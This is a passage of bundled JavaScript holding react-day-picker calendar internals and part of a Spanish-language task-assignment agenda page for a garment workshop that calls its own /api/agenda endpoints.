      (_c = range.onDayClick) === null || _c === void 0 ? void 0 : _c.call(range, date, activeModifiers, e);
    } else {
      (_d = dayPicker.onDayClick) === null || _d === void 0 ? void 0 : _d.call(dayPicker, date, activeModifiers, e);
    }
  };
  var onFocus = function(e) {
    var _a2;
    focus2(date);
    (_a2 = dayPicker.onDayFocus) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onBlur = function(e) {
    var _a2;
    blur();
    (_a2 = dayPicker.onDayBlur) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onMouseEnter = function(e) {
    var _a2;
    (_a2 = dayPicker.onDayMouseEnter) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onMouseLeave = function(e) {
    var _a2;
    (_a2 = dayPicker.onDayMouseLeave) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onPointerEnter = function(e) {
    var _a2;
    (_a2 = dayPicker.onDayPointerEnter) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onPointerLeave = function(e) {
    var _a2;
    (_a2 = dayPicker.onDayPointerLeave) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onTouchCancel = function(e) {
    var _a2;
    (_a2 = dayPicker.onDayTouchCancel) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onTouchEnd = function(e) {
    var _a2;
    (_a2 = dayPicker.onDayTouchEnd) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onTouchMove = function(e) {
    var _a2;
    (_a2 = dayPicker.onDayTouchMove) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onTouchStart = function(e) {
    var _a2;
    (_a2 = dayPicker.onDayTouchStart) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onKeyUp = function(e) {
    var _a2;
    (_a2 = dayPicker.onDayKeyUp) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var onKeyDown = function(e) {
    var _a2;
    switch (e.key) {
      case "ArrowLeft":
        e.preventDefault();
        e.stopPropagation();
        dayPicker.dir === "rtl" ? focusDayAfter() : focusDayBefore();
        break;
      case "ArrowRight":
        e.preventDefault();
        e.stopPropagation();
        dayPicker.dir === "rtl" ? focusDayBefore() : focusDayAfter();
        break;
      case "ArrowDown":
        e.preventDefault();
        e.stopPropagation();
        focusWeekAfter();
        break;
      case "ArrowUp":
        e.preventDefault();
        e.stopPropagation();
        focusWeekBefore();
        break;
      case "PageUp":
        e.preventDefault();
        e.stopPropagation();
        e.shiftKey ? focusYearBefore() : focusMonthBefore();
        break;
      case "PageDown":
        e.preventDefault();
        e.stopPropagation();
        e.shiftKey ? focusYearAfter() : focusMonthAfter();
        break;
      case "Home":
        e.preventDefault();
        e.stopPropagation();
        focusStartOfWeek();
        break;
      case "End":
        e.preventDefault();
        e.stopPropagation();
        focusEndOfWeek();
        break;
    }
    (_a2 = dayPicker.onDayKeyDown) === null || _a2 === void 0 ? void 0 : _a2.call(dayPicker, date, activeModifiers, e);
  };
  var eventHandlers = {
    onClick,
    onFocus,
    onBlur,
    onKeyDown,
    onKeyUp,
    onMouseEnter,
    onMouseLeave,
    onPointerEnter,
    onPointerLeave,
    onTouchCancel,
    onTouchEnd,
    onTouchMove,
    onTouchStart
  };
  return eventHandlers;
}
function useSelectedDays() {
  var dayPicker = useDayPicker();
  var single = useSelectSingle();
  var multiple = useSelectMultiple();
  var range = useSelectRange();
  var selectedDays = isDayPickerSingle(dayPicker) ? single.selected : isDayPickerMultiple(dayPicker) ? multiple.selected : isDayPickerRange(dayPicker) ? range.selected : void 0;
  return selectedDays;
}
function isInternalModifier(modifier) {
  return Object.values(InternalModifier).includes(modifier);
}
function getDayClassNames(dayPicker, activeModifiers) {
  var classNames = [dayPicker.classNames.day];
  Object.keys(activeModifiers).forEach(function(modifier) {
    var customClassName = dayPicker.modifiersClassNames[modifier];
    if (customClassName) {
      classNames.push(customClassName);
    } else if (isInternalModifier(modifier)) {
      var internalClassName = dayPicker.classNames["day_".concat(modifier)];
      if (internalClassName) {
        classNames.push(internalClassName);
      }
    }
  });
  return classNames;
}
function getDayStyle(dayPicker, activeModifiers) {
  var style = __assign2({}, dayPicker.styles.day);
  Object.keys(activeModifiers).forEach(function(modifier) {
    var _a;
    style = __assign2(__assign2({}, style), (_a = dayPicker.modifiersStyles) === null || _a === void 0 ? void 0 : _a[modifier]);
  });
  return style;
}
function useDayRender(day, displayMonth, buttonRef) {
  var _a;
  var _b, _c;
  var dayPicker = useDayPicker();
  var focusContext = useFocusContext();
  var activeModifiers = useActiveModifiers(day, displayMonth);
  var eventHandlers = useDayEventHandlers(day, activeModifiers);
  var selectedDays = useSelectedDays();
  var isButton = Boolean(dayPicker.onDayClick || dayPicker.mode !== "default");
  useEffect31(function() {
    var _a2;
    if (activeModifiers.outside)
      return;
    if (!focusContext.focusedDay)
      return;
    if (!isButton)
      return;
    if (isSameDay(focusContext.focusedDay, day)) {
      (_a2 = buttonRef.current) === null || _a2 === void 0 ? void 0 : _a2.focus();
    }
  }, [
    focusContext.focusedDay,
    day,
    buttonRef,
    isButton,
    activeModifiers.outside
  ]);
  var className = getDayClassNames(dayPicker, activeModifiers).join(" ");
  var style = getDayStyle(dayPicker, activeModifiers);
  var isHidden2 = Boolean(activeModifiers.outside && !dayPicker.showOutsideDays || activeModifiers.hidden);
  var DayContentComponent = (_c = (_b = dayPicker.components) === null || _b === void 0 ? void 0 : _b.DayContent) !== null && _c !== void 0 ? _c : DayContent;
  var children = jsx64(DayContentComponent, { date: day, displayMonth, activeModifiers });
  var divProps = {
    style,
    className,
    children,
    role: "gridcell"
  };
  var isFocusTarget = focusContext.focusTarget && isSameDay(focusContext.focusTarget, day) && !activeModifiers.outside;
  var isFocused = focusContext.focusedDay && isSameDay(focusContext.focusedDay, day);
  var buttonProps = __assign2(__assign2(__assign2({}, divProps), (_a = { disabled: activeModifiers.disabled, role: "gridcell" }, _a["aria-selected"] = activeModifiers.selected, _a.tabIndex = isFocused || isFocusTarget ? 0 : -1, _a)), eventHandlers);
  var dayRender = {
    isButton,
    isHidden: isHidden2,
    activeModifiers,
    selectedDays,
    buttonProps,
    divProps
  };
  return dayRender;
}
function Day(props) {
  var buttonRef = useRef24(null);
  var dayRender = useDayRender(props.date, props.displayMonth, buttonRef);
  if (dayRender.isHidden) {
    return jsx64("div", { role: "gridcell" });
  }
  if (!dayRender.isButton) {
    return jsx64("div", __assign2({}, dayRender.divProps));
  }
  return jsx64(Button2, __assign2({ name: "day", ref: buttonRef }, dayRender.buttonProps));
}
function WeekNumber(props) {
  var weekNumber = props.number, dates = props.dates;
  var _a = useDayPicker(), onWeekNumberClick = _a.onWeekNumberClick, styles = _a.styles, classNames = _a.classNames, locale = _a.locale, labelWeekNumber2 = _a.labels.labelWeekNumber, formatWeekNumber2 = _a.formatters.formatWeekNumber;
  var content = formatWeekNumber2(Number(weekNumber), { locale });
  if (!onWeekNumberClick) {
    return jsx64("span", { className: classNames.weeknumber, style: styles.weeknumber, children: content });
  }
  var label = labelWeekNumber2(Number(weekNumber), { locale });
  var handleClick = function(e) {
    onWeekNumberClick(weekNumber, dates, e);
  };
  return jsx64(Button2, { name: "week-number", "aria-label": label, className: classNames.weeknumber, style: styles.weeknumber, onClick: handleClick, children: content });
}
function Row(props) {
  var _a, _b;
  var _c = useDayPicker(), styles = _c.styles, classNames = _c.classNames, showWeekNumber = _c.showWeekNumber, components = _c.components;
  var DayComponent = (_a = components === null || components === void 0 ? void 0 : components.Day) !== null && _a !== void 0 ? _a : Day;
  var WeeknumberComponent = (_b = components === null || components === void 0 ? void 0 : components.WeekNumber) !== null && _b !== void 0 ? _b : WeekNumber;
  var weekNumberCell;
  if (showWeekNumber) {
    weekNumberCell = jsx64("td", { className: classNames.cell, style: styles.cell, children: jsx64(WeeknumberComponent, { number: props.weekNumber, dates: props.dates }) });
  }
  return jsxs32("tr", { className: classNames.row, style: styles.row, children: [weekNumberCell, props.dates.map(function(date) {
    return jsx64("td", { className: classNames.cell, style: styles.cell, role: "presentation", children: jsx64(DayComponent, { displayMonth: props.displayMonth, date }) }, getUnixTime(date));
  })] });
}
function daysToMonthWeeks(fromDate, toDate2, options) {
  var toWeek = (options === null || options === void 0 ? void 0 : options.ISOWeek) ? endOfISOWeek(toDate2) : endOfWeek(toDate2, options);
  var fromWeek = (options === null || options === void 0 ? void 0 : options.ISOWeek) ? startOfISOWeek(fromDate) : startOfWeek(fromDate, options);
  var nOfDays = differenceInCalendarDays(toWeek, fromWeek);
  var days = [];
  for (var i = 0; i <= nOfDays; i++) {
    days.push(addDays(fromWeek, i));
  }
  var weeksInMonth = days.reduce(function(result, date) {
    var weekNumber = (options === null || options === void 0 ? void 0 : options.ISOWeek) ? getISOWeek(date) : getWeek(date, options);
    var existingWeek = result.find(function(value) {
      return value.weekNumber === weekNumber;
    });
    if (existingWeek) {
      existingWeek.dates.push(date);
      return result;
    }
    result.push({
      weekNumber,
      dates: [date]
    });
    return result;
  }, []);
  return weeksInMonth;
}
function getMonthWeeks(month, options) {
  var weeksInMonth = daysToMonthWeeks(startOfMonth(month), endOfMonth(month), options);
  if (options === null || options === void 0 ? void 0 : options.useFixedWeeks) {
    var nrOfMonthWeeks = getWeeksInMonth(month, options);
    if (nrOfMonthWeeks < 6) {
      var lastWeek = weeksInMonth[weeksInMonth.length - 1];
      var lastDate = lastWeek.dates[lastWeek.dates.length - 1];
      var toDate2 = addWeeks(lastDate, 6 - nrOfMonthWeeks);
      var extraWeeks = daysToMonthWeeks(addWeeks(lastDate, 1), toDate2, options);
      weeksInMonth.push.apply(weeksInMonth, extraWeeks);
    }
  }
  return weeksInMonth;
}
function Table2(props) {
  var _a, _b, _c;
  var _d = useDayPicker(), locale = _d.locale, classNames = _d.classNames, styles = _d.styles, hideHead = _d.hideHead, fixedWeeks = _d.fixedWeeks, components = _d.components, weekStartsOn = _d.weekStartsOn, firstWeekContainsDate = _d.firstWeekContainsDate, ISOWeek = _d.ISOWeek;
  var weeks = getMonthWeeks(props.displayMonth, {
    useFixedWeeks: Boolean(fixedWeeks),
    ISOWeek,
    locale,
    weekStartsOn,
    firstWeekContainsDate
  });
  var HeadComponent = (_a = components === null || components === void 0 ? void 0 : components.Head) !== null && _a !== void 0 ? _a : Head;
  var RowComponent = (_b = components === null || components === void 0 ? void 0 : components.Row) !== null && _b !== void 0 ? _b : Row;
  var FooterComponent = (_c = components === null || components === void 0 ? void 0 : components.Footer) !== null && _c !== void 0 ? _c : Footer;
  return jsxs32("table", { id: props.id, className: classNames.table, style: styles.table, role: "grid", "aria-labelledby": props["aria-labelledby"], children: [!hideHead && jsx64(HeadComponent, {}), jsx64("tbody", { className: classNames.tbody, style: styles.tbody, children: weeks.map(function(week) {
    return jsx64(RowComponent, { displayMonth: props.displayMonth, dates: week.dates, weekNumber: week.weekNumber }, week.weekNumber);
  }) }), jsx64(FooterComponent, { displayMonth: props.displayMonth })] });
}
function canUseDOM2() {
  return !!(typeof window !== "undefined" && window.document && window.document.createElement);
}
var useIsomorphicLayoutEffect4 = canUseDOM2() ? useLayoutEffect6 : useEffect31;
var serverHandoffComplete = false;
var id = 0;
function genId2() {
  return "react-day-picker-".concat(++id);
}
function useId2(providedId) {
  var _a;
  var initialId = providedId !== null && providedId !== void 0 ? providedId : serverHandoffComplete ? genId2() : null;
  var _b = useState38(initialId), id2 = _b[0], setId = _b[1];
  useIsomorphicLayoutEffect4(function() {
    if (id2 === null) {
      setId(genId2());
    }
  }, []);
  useEffect31(function() {
    if (serverHandoffComplete === false) {
      serverHandoffComplete = true;
    }
  }, []);
  return (_a = providedId !== null && providedId !== void 0 ? providedId : id2) !== null && _a !== void 0 ? _a : void 0;
}
function Month(props) {
  var _a;
  var _b;
  var dayPicker = useDayPicker();
  var dir = dayPicker.dir, classNames = dayPicker.classNames, styles = dayPicker.styles, components = dayPicker.components;
  var displayMonths = useNavigation().displayMonths;
  var captionId = useId2(dayPicker.id ? "".concat(dayPicker.id, "-").concat(props.displayIndex) : void 0);
  var tableId = dayPicker.id ? "".concat(dayPicker.id, "-grid-").concat(props.displayIndex) : void 0;
  var className = [classNames.month];
  var style = styles.month;
  var isStart = props.displayIndex === 0;
  var isEnd = props.displayIndex === displayMonths.length - 1;
  var isCenter = !isStart && !isEnd;
  if (dir === "rtl") {
    _a = [isStart, isEnd], isEnd = _a[0], isStart = _a[1];
  }
  if (isStart) {
    className.push(classNames.caption_start);
    style = __assign2(__assign2({}, style), styles.caption_start);
  }
  if (isEnd) {
    className.push(classNames.caption_end);
    style = __assign2(__assign2({}, style), styles.caption_end);
  }
  if (isCenter) {
    className.push(classNames.caption_between);
    style = __assign2(__assign2({}, style), styles.caption_between);
  }
  var CaptionComponent = (_b = components === null || components === void 0 ? void 0 : components.Caption) !== null && _b !== void 0 ? _b : Caption;
  return jsxs32("div", { className: className.join(" "), style, children: [jsx64(CaptionComponent, { id: captionId, displayMonth: props.displayMonth, displayIndex: props.displayIndex }), jsx64(Table2, { id: tableId, "aria-labelledby": captionId, displayMonth: props.displayMonth })] }, props.displayIndex);
}
function Months(props) {
  var _a = useDayPicker(), classNames = _a.classNames, styles = _a.styles;
  return jsx64("div", { className: classNames.months, style: styles.months, children: props.children });
}
function Root9(_a) {
  var _b, _c;
  var initialProps = _a.initialProps;
  var dayPicker = useDayPicker();
  var focusContext = useFocusContext();
  var navigation = useNavigation();
  var _d = useState38(false), hasInitialFocus = _d[0], setHasInitialFocus = _d[1];
  useEffect31(function() {
    if (!dayPicker.initialFocus)
      return;
    if (!focusContext.focusTarget)
      return;
    if (hasInitialFocus)
      return;
    focusContext.focus(focusContext.focusTarget);
    setHasInitialFocus(true);
  }, [
    dayPicker.initialFocus,
    hasInitialFocus,
    focusContext.focus,
    focusContext.focusTarget,
    focusContext
  ]);
  var classNames = [dayPicker.classNames.root, dayPicker.className];
  if (dayPicker.numberOfMonths > 1) {
    classNames.push(dayPicker.classNames.multiple_months);
  }
  if (dayPicker.showWeekNumber) {
    classNames.push(dayPicker.classNames.with_weeknumber);
  }
  var style = __assign2(__assign2({}, dayPicker.styles.root), dayPicker.style);
  var dataAttributes = Object.keys(initialProps).filter(function(key) {
    return key.startsWith("data-");
  }).reduce(function(attrs, key) {
    var _a2;
    return __assign2(__assign2({}, attrs), (_a2 = {}, _a2[key] = initialProps[key], _a2));
  }, {});
  var MonthsComponent = (_c = (_b = initialProps.components) === null || _b === void 0 ? void 0 : _b.Months) !== null && _c !== void 0 ? _c : Months;
  return jsx64("div", __assign2({ className: classNames.join(" "), style, dir: dayPicker.dir, id: dayPicker.id, nonce: initialProps.nonce, title: initialProps.title, lang: initialProps.lang }, dataAttributes, { children: jsx64(MonthsComponent, { children: navigation.displayMonths.map(function(month, i) {
    return jsx64(Month, { displayIndex: i, displayMonth: month }, i);
  }) }) }));
}
function RootProvider(props) {
  var children = props.children, initialProps = __rest2(props, ["children"]);
  return jsx64(DayPickerProvider, { initialProps, children: jsx64(NavigationProvider, { children: jsx64(SelectSingleProvider, { initialProps, children: jsx64(SelectMultipleProvider, { initialProps, children: jsx64(SelectRangeProvider, { initialProps, children: jsx64(ModifiersProvider, { children: jsx64(FocusProvider, { children }) }) }) }) }) }) });
}
function DayPicker(props) {
  return jsx64(RootProvider, __assign2({}, props, { children: jsx64(Root9, { initialProps: props }) }));
}

// client/src/components/ui/calendar.tsx
import { jsx as jsx65 } from "react/jsx-runtime";
function Calendar2({
  className,
  classNames,
  showOutsideDays = true,
  ...props
}) {
  return /* @__PURE__ */ jsx65(
    DayPicker,
    {
      showOutsideDays,
      className: cn("p-3", className),
      classNames: {
        months: "flex flex-col sm:flex-row space-y-4 sm:space-x-4 sm:space-y-0",
        month: "space-y-4",
        caption: "flex justify-center pt-1 relative items-center",
        caption_label: "text-sm font-medium",
        nav: "space-x-1 flex items-center",
        nav_button: cn(
          buttonVariants({ variant: "outline" }),
          "h-7 w-7 bg-transparent p-0 opacity-50 hover:opacity-100"
        ),
        nav_button_previous: "absolute left-1",
        nav_button_next: "absolute right-1",
        table: "w-full border-collapse space-y-1",
        head_row: "flex",
        head_cell: "text-muted-foreground rounded-md w-9 font-normal text-[0.8rem]",
        row: "flex w-full mt-2",
        cell: "h-9 w-9 text-center text-sm p-0 relative [&:has([aria-selected].day-range-end)]:rounded-r-md [&:has([aria-selected].day-outside)]:bg-accent/50 [&:has([aria-selected])]:bg-accent first:[&:has([aria-selected])]:rounded-l-md last:[&:has([aria-selected])]:rounded-r-md focus-within:relative focus-within:z-20",
        day: cn(
          buttonVariants({ variant: "ghost" }),
          "h-9 w-9 p-0 font-normal aria-selected:opacity-100"
        ),
        day_range_end: "day-range-end",
        day_selected: "bg-primary text-primary-foreground hover:bg-primary hover:text-primary-foreground focus:bg-primary focus:text-primary-foreground",
        day_today: "bg-accent text-accent-foreground",
        day_outside: "day-outside text-muted-foreground aria-selected:bg-accent/50 aria-selected:text-muted-foreground",
        day_disabled: "text-muted-foreground opacity-50",
        day_range_middle: "aria-selected:bg-accent aria-selected:text-accent-foreground",
        day_hidden: "invisible",
        ...classNames
      },
      components: {
        IconLeft: ({ className: className2, ...props2 }) => /* @__PURE__ */ jsx65(ChevronLeft, { className: cn("h-4 w-4", className2), ...props2 }),
        IconRight: ({ className: className2, ...props2 }) => /* @__PURE__ */ jsx65(ChevronRight, { className: cn("h-4 w-4", className2), ...props2 })
      },
      ...props
    }
  );
}
Calendar2.displayName = "Calendar";

// client/src/pages/agenda-page.tsx
import { jsx as jsx66, jsxs as jsxs33 } from "react/jsx-runtime";
function AgendaPage() {
  const { user } = useAuth();
  const { toast: toast2 } = useToast();
  const [selectedDate, setSelectedDate] = useState39(/* @__PURE__ */ new Date());
  const [currentWeekStart, setCurrentWeekStart] = useState39(() => {
    const today = /* @__PURE__ */ new Date();
    const monday = new Date(today);
    monday.setDate(today.getDate() - today.getDay() + 1);
    return monday;
  });
  const [events2, setEvents] = useState39([]);
  const [showEventModal, setShowEventModal] = useState39(false);
  const [editingEvent, setEditingEvent] = useState39(null);
  const [loading, setLoading] = useState39(true);
  const canCreateEdit = user?.area === "admin" || user?.area === "envios";
  const [eventForm, setEventForm] = useState39({
    assignedToArea: "corte",
    title: "",
    description: "",
    date: selectedDate.toISOString().split("T")[0],
    time: (/* @__PURE__ */ new Date()).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" }),
    priority: "media",
    status: "pendiente"
  });
  useEffect32(() => {
    fetchEvents();
  }, []);
  useEffect32(() => {
    setEventForm((prev) => ({
      ...prev,
      date: selectedDate.toISOString().split("T")[0]
    }));
  }, [selectedDate]);
  const fetchEvents = async () => {
    try {
      const response = await fetch("/api/agenda");
      if (response.ok) {
        const data = await response.json();
        setEvents(data);
      }
    } catch (error) {
      console.error("Error fetching events:", error);
      toast2({
        title: "Error",
        description: "No se pudieron cargar las tareas",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const url = editingEvent ? `/api/agenda/${editingEvent.id}` : "/api/agenda";
      const method = editingEvent ? "PUT" : "POST";
      const response = await fetch(url, {
        method,
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(eventForm)
      });
      if (response.ok) {
        toast2({
          title: "\xC9xito",
          description: editingEvent ? "Tarea actualizada" : "Tarea creada"
        });
        fetchEvents();
        setShowEventModal(false);
        resetForm();
      } else {
        const error = await response.json();
        throw new Error(error.message);
      }
    } catch (error) {
      console.error("Error saving event:", error);
      toast2({
        title: "Error",
        description: error.message || "No se pudo guardar la tarea",
        variant: "destructive"
      });
    }
  };
  const handleStatusUpdate = async (eventId, newStatus) => {
    try {
      const response = await fetch(`/api/agenda/${eventId}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ status: newStatus })
      });
      if (response.ok) {
        toast2({
          title: "\xC9xito",
          description: "Estado de la tarea actualizado"
        });
        fetchEvents();
      }
    } catch (error) {
      console.error("Error updating status:", error);
      toast2({
        title: "Error",
        description: "No se pudo actualizar el estado",
        variant: "destructive"
      });
    }
  };
  const handleDelete = async (eventId) => {
    try {
      const response = await fetch(`/api/agenda/${eventId}`, {
        method: "DELETE"
      });
      if (response.ok) {
        toast2({
          title: "\xC9xito",
          description: "Tarea eliminada"
        });
        fetchEvents();
      } else {
        const error = await response.json();
        throw new Error(error.message);
      }
    } catch (error) {
      console.error("Error deleting event:", error);
      toast2({
        title: "Error",
        description: error.message || "No se pudo eliminar la tarea",
        variant: "destructive"
      });
    }
  };
  const resetForm = () => {
    setEventForm({
      assignedToArea: "corte",
      title: "",
      description: "",
      date: selectedDate.toISOString().split("T")[0],
      time: (/* @__PURE__ */ new Date()).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" }),
      priority: "media",
      status: "pendiente"
    });
    setEditingEvent(null);
  };
  const startEdit = (event) => {
    setEventForm({
      assignedToArea: event.assignedToArea,
      title: event.title,
      description: event.description,
      date: event.date,
      time: event.time,
      priority: event.priority,
      status: event.status
    });
    setEditingEvent(event);
    setShowEventModal(true);
  };
  const getWeekDays = (weekStart) => {
    const days = [];
    for (let i = 0; i < 5; i++) {
      const day = new Date(weekStart);
      day.setDate(weekStart.getDate() + i);
      days.push(day);
    }
    return days;
  };
  const weekDays = getWeekDays(currentWeekStart);
  const goToPreviousWeek = () => {
    const newWeekStart = new Date(currentWeekStart);
    newWeekStart.setDate(currentWeekStart.getDate() - 7);
    setCurrentWeekStart(newWeekStart);
  };
  const goToNextWeek = () => {
    const newWeekStart = new Date(currentWeekStart);
    newWeekStart.setDate(currentWeekStart.getDate() + 7);
    setCurrentWeekStart(newWeekStart);
  };
  const goToCurrentWeek = () => {
    const today = /* @__PURE__ */ new Date();
    const monday = new Date(today);
    monday.setDate(today.getDate() - today.getDay() + 1);
    setCurrentWeekStart(monday);
  };
  const getEventsForDate = (date) => {
    const dateStr = date.toISOString().split("T")[0];
    return events2.filter((event) => event.date === dateStr).sort((a, b) => a.time.localeCompare(b.time));
  };
  const getPriorityColor = (priority) => {
    switch (priority) {
      case "alta":
        return "bg-red-500";
      case "media":
        return "bg-yellow-500";
      case "baja":
        return "bg-green-500";
      default:
        return "bg-gray-500";
    }
  };
  const getStatusColor = (status) => {
    switch (status) {
      case "completado":
        return "bg-green-100 text-green-800";
      case "cancelado":
        return "bg-red-100 text-red-800";
      case "pendiente":
        return "bg-blue-100 text-blue-800";
      default:
        return "bg-gray-100 text-gray-800";
    }
  };
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      admin: "Administraci\xF3n",
      operaciones: "Operaciones"
    };
    return names[area] || area;
  };
  const formatDisplayTime = (timeString) => {
    const [hours, minutes] = timeString.split(":");
    const hour24 = parseInt(hours, 10);
    const hour12 = hour24 === 0 ? 12 : hour24 > 12 ? hour24 - 12 : hour24;
    const ampm = hour24 >= 12 ? "PM" : "AM";
    return `${hour12}:${minutes} ${ampm}`;
  };
  const getDayName = (date) => {
    return date.toLocaleDateString("es-MX", { weekday: "long" });
  };
  const isToday = (date) => {
    const today = /* @__PURE__ */ new Date();
    return date.toDateString() === today.toDateString();
  };
  return /* @__PURE__ */ jsx66(Layout, { children: /* @__PURE__ */ jsxs33("div", { className: "space-y-6", children: [
    /* @__PURE__ */ jsxs33("div", { className: "flex justify-between items-center", children: [
      /* @__PURE__ */ jsxs33("div", { children: [
        /* @__PURE__ */ jsx66("h1", { className: "text-3xl font-bold", children: "Sistema de Asignaci\xF3n de Tareas" }),
        /* @__PURE__ */ jsx66("p", { className: "text-gray-600", children: canCreateEdit ? "Gestiona y asigna tareas a las diferentes \xE1reas" : `Tareas asignadas al \xE1rea de ${getAreaDisplayName(user?.area || "")}` })
      ] }),
      canCreateEdit && /* @__PURE__ */ jsxs33(Dialog2, { open: showEventModal, onOpenChange: setShowEventModal, children: [
        /* @__PURE__ */ jsx66(DialogTrigger2, { asChild: true, children: /* @__PURE__ */ jsxs33(Button, { onClick: resetForm, children: [
          /* @__PURE__ */ jsx66(Plus, { className: "h-4 w-4 mr-2" }),
          "Nueva Tarea"
        ] }) }),
        /* @__PURE__ */ jsxs33(DialogContent2, { className: "max-w-md", children: [
          /* @__PURE__ */ jsx66(DialogHeader, { children: /* @__PURE__ */ jsx66(DialogTitle2, { children: editingEvent ? "Editar Tarea" : "Nueva Tarea" }) }),
          /* @__PURE__ */ jsxs33("form", { onSubmit: handleSubmit, className: "space-y-4", children: [
            /* @__PURE__ */ jsxs33("div", { children: [
              /* @__PURE__ */ jsx66(Label2, { htmlFor: "assignedToArea", children: "Asignar a \xC1rea" }),
              /* @__PURE__ */ jsxs33(
                Select2,
                {
                  value: eventForm.assignedToArea,
                  onValueChange: (value) => setEventForm({ ...eventForm, assignedToArea: value }),
                  children: [
                    /* @__PURE__ */ jsx66(SelectTrigger2, { children: /* @__PURE__ */ jsx66(SelectValue2, {}) }),
                    /* @__PURE__ */ jsxs33(SelectContent2, { children: [
                      /* @__PURE__ */ jsx66(SelectItem2, { value: "corte", children: "Corte" }),
                      /* @__PURE__ */ jsx66(SelectItem2, { value: "bordado", children: "Bordado" }),
                      /* @__PURE__ */ jsx66(SelectItem2, { value: "ensamble", children: "Ensamble" }),
                      /* @__PURE__ */ jsx66(SelectItem2, { value: "plancha", children: "Plancha/Empaque" }),
                      /* @__PURE__ */ jsx66(SelectItem2, { value: "calidad", children: "Calidad" }),
                      /* @__PURE__ */ jsx66(SelectItem2, { value: "operaciones", children: "Operaciones" })
                    ] })
                  ]
                }
              )
            ] }),
            /* @__PURE__ */ jsxs33("div", { children: [
              /* @__PURE__ */ jsx66(Label2, { htmlFor: "title", children: "T\xEDtulo de la Tarea" }),
              /* @__PURE__ */ jsx66(
                Input,
                {
                  id: "title",
                  value: eventForm.title,
                  onChange: (e) => setEventForm({ ...eventForm, title: e.target.value }),
                  required: true
                }
              )
            ] }),
            /* @__PURE__ */ jsxs33("div", { children: [
              /* @__PURE__ */ jsx66(Label2, { htmlFor: "description", children: "Descripci\xF3n" }),
              /* @__PURE__ */ jsx66(
                Textarea,
                {
                  id: "description",
                  value: eventForm.description,
                  onChange: (e) => setEventForm({ ...eventForm, description: e.target.value })
                }
              )
            ] }),
            /* @__PURE__ */ jsxs33("div", { className: "grid grid-cols-2 gap-2", children: [
              /* @__PURE__ */ jsxs33("div", { children: [
                /* @__PURE__ */ jsx66(Label2, { htmlFor: "date", children: "Fecha" }),
                /* @__PURE__ */ jsx66(
                  Input,
                  {
                    id: "date",
                    type: "date",
                    value: eventForm.date,
                    onChange: (e) => setEventForm({ ...eventForm, date: e.target.value }),
                    required: true
                  }
                )
              ] }),
              /* @__PURE__ */ jsxs33("div", { children: [
                /* @__PURE__ */ jsx66(Label2, { htmlFor: "time", children: "Hora" }),
                /* @__PURE__ */ jsx66(
                  Input,
                  {
                    id: "time",
                    type: "time",
                    value: eventForm.time,
                    onChange: (e) => setEventForm({ ...eventForm, time: e.target.value }),
                    required: true
                  }
                )
              ] })
            ] }),
            /* @__PURE__ */ jsxs33("div", { className: "grid grid-cols-2 gap-2", children: [
              /* @__PURE__ */ jsxs33("div", { children: [
                /* @__PURE__ */ jsx66(Label2, { htmlFor: "priority", children: "Prioridad" }),
                /* @__PURE__ */ jsxs33(
                  Select2,
                  {
                    value: eventForm.priority,
                    onValueChange: (value) => setEventForm({ ...eventForm, priority: value }),
                    children: [
                      /* @__PURE__ */ jsx66(SelectTrigger2, { children: /* @__PURE__ */ jsx66(SelectValue2, {}) }),
                      /* @__PURE__ */ jsxs33(SelectContent2, { children: [
                        /* @__PURE__ */ jsx66(SelectItem2, { value: "alta", children: "Alta" }),
                        /* @__PURE__ */ jsx66(SelectItem2, { value: "media", children: "Media" }),
                        /* @__PURE__ */ jsx66(SelectItem2, { value: "baja", children: "Baja" })
                      ] })
                    ]
                  }
                )
              ] }),
              /* @__PURE__ */ jsxs33("div", { children: [
                /* @__PURE__ */ jsx66(Label2, { htmlFor: "status", children: "Estado" }),
                /* @__PURE__ */ jsxs33(
                  Select2,
                  {
                    value: eventForm.status,
                    onValueChange: (value) => setEventForm({ ...eventForm, status: value }),
                    children: [
                      /* @__PURE__ */ jsx66(SelectTrigger2, { children: /* @__PURE__ */ jsx66(SelectValue2, {}) }),
                      /* @__PURE__ */ jsxs33(SelectContent2, { children: [
                        /* @__PURE__ */ jsx66(SelectItem2, { value: "pendiente", children: "Pendiente" }),
                        /* @__PURE__ */ jsx66(SelectItem2, { value: "completado", children: "Completado" }),
                        /* @__PURE__ */ jsx66(SelectItem2, { value: "cancelado", children: "Cancelado" })
                      ] })
                    ]
                  }
                )
              ] })
            ] }),
            /* @__PURE__ */ jsxs33("div", { className: "flex justify-end space-x-2", children: [
              /* @__PURE__ */ jsx66(Button, { type: "button", variant: "outline", onClick: () => setShowEventModal(false), children: "Cancelar" }),
              /* @__PURE__ */ jsx66(Button, { type: "submit", children: editingEvent ? "Actualizar" : "Crear" })
            ] })
          ] })
        ] })
      ] })
    ] }),
    /* @__PURE__ */ jsxs33("div", { className: "grid grid-cols-1 lg:grid-cols-4 gap-6", children: [
      /* @__PURE__ */ jsxs33(Card, { className: "lg:col-span-1", children: [
